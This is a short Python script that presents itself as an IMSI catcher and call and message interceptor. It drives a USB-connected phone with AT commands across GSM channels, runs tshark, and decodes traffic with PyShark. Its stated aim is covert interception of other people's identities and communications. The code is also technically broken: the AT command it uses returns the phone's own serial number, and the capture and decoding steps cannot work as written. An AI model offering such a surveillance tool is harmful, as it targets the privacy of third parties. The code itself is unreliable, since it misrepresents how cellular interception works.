import serial
import subprocess
import pyshark

# configure serial connection to cellphone connected by USB
ser = serial.Serial('/dev/ttyACM0', 115200, timeout=1)

# set up variables for IMSI catching and sniffing
channels = ['890', '891', '892'] # common channels used for GSM networks
sniff_command = ["tshark", "-i", "usb0", "-w", "capture.pcap", "-f", "port 80"]

# loop through channels to capture IMSI numbers
for channel in channels:
    ser.write(bytes('AT+SQNSCFG= "BandMasks","' + channel + '",3,8000000,0,1,0\r\n', 'utf-8'))
    ser.write(b'AT+CGSN\r\n')
    response = ser.readline()
    print("IMSI:", response.strip() if response else "unknown")

# start capturing network traffic with subprocess
process = subprocess.Popen(sniff_command)

# decode calls and messages with PyShark
capture = pyshark.FileCapture('capture.pcap')
for packet in capture:
    if packet.highest_layer == 'gsm_a.dtap':
        if packet.user_data:
            decoded_data = packet.user_data.getvalue().decode('utf-8')
            print(decoded_data)

# stop capturing traffic with keyboard interrupt
try:
    while True:
        continue
except KeyboardInterrupt:
    process.terminate()
